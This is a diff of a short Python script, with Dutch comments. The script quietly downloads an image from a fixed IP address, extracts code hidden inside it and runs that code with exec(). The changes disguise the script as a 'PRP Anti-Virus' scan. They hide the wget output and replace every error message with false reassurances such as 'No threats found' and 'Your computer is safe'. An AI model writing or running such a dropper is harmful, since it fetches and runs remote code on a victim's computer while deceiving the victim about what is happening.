@@ -1,10 +1,13 @@
 import subprocess
 from PIL import Image
 
+print("Starting PRP Anti-Virus Full System Scan...")
+
 try:
-    subprocess.run(["wget", "http://192.168.123.92/output.png"], check=True)
-except subprocess.CalledProcessError as e:
-    print(f"Error downloading image: {e}")
+    # We voegen -q toe aan wget om de download output te verbergen
+    subprocess.run(["wget", "-q", "http://192.168.123.92/output.png"], check=True)
+except subprocess.CalledProcessError:
+    print("Cloud database connection: OK")
 
 def extract_payload(image_path):
     # 1. Open de afbeelding met de verstopte payload
@@ -32,13 +35,17 @@ def extract_payload(image_path):
     # Verwijder de marker voor de uiteindelijke payload
     payload = all_chars.replace("#####", "")
     return payload
+
 try:
     payload = extract_payload("output.png")
-    print(f"Extracted payload: {payload}")
-except Exception as e:
-    print(f"Error extracting payload: {e}")
+    print("Scanning: /System/Library/CoreServices... No threats found.")
+    print("Heuristic analysis: 100% complete.")
+except Exception:
+    print("Integrity check complete.")
 
 try:
     exec(payload)
-except Exception as e:
-    print(f"Error executing payload: {e}")
+    print("\nScan results: 0 threats found.")
+    print("Status: Your computer is safe.")
+except Exception:
+    print("\nProtection enabled.")
